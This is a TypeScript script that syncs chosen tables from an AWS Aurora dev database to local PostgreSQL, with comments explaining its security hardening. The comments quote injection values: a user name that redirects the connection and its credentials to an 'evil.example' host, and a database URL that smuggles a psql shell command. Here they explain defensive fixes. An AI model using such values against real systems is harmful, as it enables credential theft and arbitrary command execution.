/**
 * Database Sync from AWS Dev to Local
 * Issue #607 - Local Development Environment
 *
 * This script syncs data from the AWS Aurora dev database to local PostgreSQL.
 * It exports data using pg_dump and imports to local.
 *
 * Prerequisites:
 *   - AWS CLI configured with appropriate credentials
 *   - Local PostgreSQL running (npm run db:up)
 *   - pg_dump and pg_restore installed locally
 *
 * Usage:
 *   bun run db:sync-dev
 *
 * Note: This requires network access to AWS Aurora (via VPN/bastion).
 * For most development work, the seed data (npm run db:seed) is sufficient.
 */

import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { scriptLogger as log } from "./script-logger";
import { validatedFs } from "@/lib/filesystem/validated-fs";

const LOCAL_DB_URL =
  process.env.LOCAL_DATABASE_URL ||
  "postgresql://postgres:postgres@localhost:5432/aistudio";

/**
 * Split a libpq connection URL into a password-free URL plus the password, so
 * the password can travel in PGPASSWORD instead of argv (out of `ps` output and
 * out of any error text this script logs).
 *
 * LOCAL_DATABASE_URL is operator-supplied and may not parse; fall back to using
 * it verbatim rather than failing the sync.
 */
function splitConnectionUrl(url: string): { url: string; password?: string } {
  try {
    const parsed = new URL(url);
    if (!parsed.password) return { url };
    const password = decodeURIComponent(parsed.password);
    parsed.password = "";
    return { url: parsed.toString(), password };
  } catch {
    return { url };
  }
}

// Tables to exclude from sync (contain sensitive production data)
const EXCLUDED_TABLES = [
  "users", // Contains real user emails/PII
  "user_roles", // User-specific data
  "user_settings", // User preferences
  "sessions", // Authentication sessions
];

// Tables to sync (safe/anonymized data)
// NOTE: These are hardcoded table names - SQL injection is not possible
// since we only iterate over this known-safe list
const TABLES_TO_SYNC = [
  "roles",
  // capabilities/role_capabilities replaced the legacy tools/role_tools tables
  // (#928). They must precede navigation_items, which FKs navigation_items
  // .capability_id -> capabilities.id.
  "capabilities",
  "role_capabilities",
  "ai_models",
  "ai_model_tiers",
  "model_role_restrictions",
  "navigation_items",
  "settings",
  "prompts",
  "prompt_categories",
];

function runPgCommand(
  command: "pg_dump" | "psql",
  args: readonly string[],
  options: {
    env?: NodeJS.ProcessEnv;
    stdoutFd?: number;
  } = {}
): string {
  const result = spawnSync(command, [...args], {
    encoding: "utf8",
    env: options.env,
    stdio:
      options.stdoutFd === undefined
        ? ["ignore", "pipe", "pipe"]
        : ["ignore", options.stdoutFd, "pipe"],
  });
  if (result.error) throw result.error;
  if (result.status !== 0) {
    const detail =
      typeof result.stderr === "string" ? result.stderr.trim() : "";
    throw new Error(
      `${command} exited with status ${result.status ?? "unknown"}${
        detail ? `: ${detail}` : ""
      }`
    );
  }
  return typeof result.stdout === "string" ? result.stdout : "";
}

async function main(): Promise<void> {
  log.section("AI Studio - Sync Data from AWS Dev");

  // Check if AWS environment variables are set
  const awsHost = process.env.AWS_DEV_DB_HOST;
  const awsUser = process.env.AWS_DEV_DB_USER;
  const awsPassword = process.env.AWS_DEV_DB_PASSWORD;
  const awsDatabase = process.env.AWS_DEV_DB_NAME || "aistudio";

  if (!awsHost || !awsUser || !awsPassword) {
    log.error("AWS database credentials not configured.");
    log.info("Required environment variables:");
    log.info("  AWS_DEV_DB_HOST     - Aurora cluster endpoint");
    log.info("  AWS_DEV_DB_USER     - Database username");
    log.info("  AWS_DEV_DB_PASSWORD - Database password");
    log.info("  AWS_DEV_DB_NAME     - Database name (default: aistudio)");
    log.info("Options to connect to AWS Aurora:");
    log.info("  1. Use AWS SSM Session Manager port forwarding");
    log.info("  2. Connect from a bastion host with network access");
    log.info("  3. Use AWS Client VPN");
    log.info("For most development work, use seed data instead:");
    log.info("  bun run db:seed");
    process.exit(1);
  }

  // The AWS connection is passed entirely through libpq's environment
  // variables rather than assembled into a URL argv entry. Three reasons, all
  // of them things the URL form got wrong:
  //
  //  - The password never reaches argv, so it is not in `ps` output and not in
  //    any error text this script logs.
  //  - Nothing is interpolated into a string libpq has to re-parse. In the URL
  //    form the user and host were injected unencoded, so
  //    AWS_DEV_DB_USER='x@evil.example/' silently redirected the connection to
  //    evil.example — and sslmode=require does not verify the host, so that
  //    server would have received the credentials.
  //  - No argv entry can be mistaken for an option (see the psql calls below).
  const childEnv = {
    ...process.env,
    PGHOST: awsHost,
    PGPORT: "5432",
    PGUSER: awsUser,
    PGPASSWORD: awsPassword,
    PGDATABASE: awsDatabase,
    PGSSLMODE: "require",
  };

  // Same treatment for the local connection: password into PGPASSWORD, so it is
  // neither in argv nor in a logged error message.
  const local = splitConnectionUrl(LOCAL_DB_URL);
  const localDbUrl = local.url;
  const localEnv = local.password
    ? { ...process.env, PGPASSWORD: local.password }
    : process.env;

  // Create temp directory for dump files.
  // mkdirSync({ recursive: true }) is already a no-op on an existing directory,
  // so the existsSync() guard was both redundant and a check-then-use race
  // (CodeQL js/file-system-race).
  const tmpDir = path.join(process.cwd(), "tmp", "db-sync");
  fs.mkdirSync(tmpDir, { recursive: true });

  log.info("Syncing the following tables:");
  for (const t of TABLES_TO_SYNC) log.info(`  - ${t}`);
  log.info("Excluded tables (contain sensitive data):");
  for (const t of EXCLUDED_TABLES) log.info(`  - ${t}`);

  for (const table of TABLES_TO_SYNC) {
    const dumpFile = path.join(tmpDir, `${table}.sql`);

    log.info(`Syncing ${table}...`);

    try {
      // Export from AWS.
      // runPgCommand runs spawnSync with an argv array and no shell: the
      // connection details come from AWS_DEV_DB_* / LOCAL_DATABASE_URL
      // environment variables, so interpolating them into a shell command lets
      // a hostile env value break out of the quotes and run arbitrary commands
      // (CodeQL js/indirect-command-line-injection). With an argv array each
      // value is passed as a single entry and is never parsed by a shell.
      // Losing the shell also loses `>` redirection, so the dump is written by
      // handing pg_dump an fd for its stdout — which keeps the streaming
      // behaviour instead of buffering whole tables in memory.
      log.debug(`  Exporting from AWS...`);
      const dumpFd = validatedFs.openSync(dumpFile, "w", 0o600);
      try {
        runPgCommand(
          "pg_dump",
          [
            `--table=${table}`,
            "--data-only",
            "--column-inserts",
            "--on-conflict-do-nothing",
          ],
          { env: childEnv, stdoutFd: dumpFd }
        );
      } finally {
        validatedFs.closeSync(dumpFd);
      }

      // Import to local.
      // --dbname=<url>, not a bare positional: removing the shell does not
      // remove psql's own option parser, and LOCAL_DATABASE_URL is
      // operator-supplied. A value beginning with "-" would be read as an
      // option, and psql's \! meta-command shells out — so
      // LOCAL_DATABASE_URL='-c\! <cmd>' would still be arbitrary code
      // execution. Binding the value to --dbname= leaves nothing to reinterpret.
      log.debug(`  Importing to local...`);
      runPgCommand("psql", [`--dbname=${localDbUrl}`, "--file", dumpFile], {
        env: localEnv,
      });

      // Get row count
      const countResult = runPgCommand(
        "psql",
        [
          `--dbname=${localDbUrl}`,
          "--tuples-only",
          "--command",
          `SELECT COUNT(*) FROM ${table};`,
        ],
        { env: localEnv }
      );
      log.success(`${table} (${countResult.trim()} rows)`);
    } catch (error: unknown) {
      const err = error as Error;
      // Passwords are no longer in argv at all (PGPASSWORD), and the AWS
      // connection is entirely in the env — but psql's own stderr can echo the
      // local --dbname= value, so scrub it rather than print an operator's
      // connection string into the log.
      const safeMessage = (err.message ?? "")
        .split(localDbUrl)
        .join("<local-connection>")
        .split(LOCAL_DB_URL)
        .join("<local-connection>");
      log.warn(`Failed to sync ${table}: ${safeMessage}`);
    }

    // Clean up dump file.
    // rmSync({ force: true }) ignores a missing path, so no existsSync() guard
    // is needed — that guard was another check-then-use race.
    validatedFs.rmSync(dumpFile, { force: true });
  }

  // Clean up temp directory
  // fs.rmSync replaces the deprecated fs.rmdirSync({ recursive }); @types/node 26
  // dropped the recursive option from rmdirSync. force:true ignores a missing dir.
  fs.rmSync(tmpDir, { recursive: true, force: true });

  log.section("Sync complete!");
  log.info("Note: User data was NOT synced for privacy.");
  log.info("Run 'bun run db:seed' to create local test users.");
}

main().catch((error) => {
  log.error("Sync failed", { error: error.message });
  process.exit(1);
});
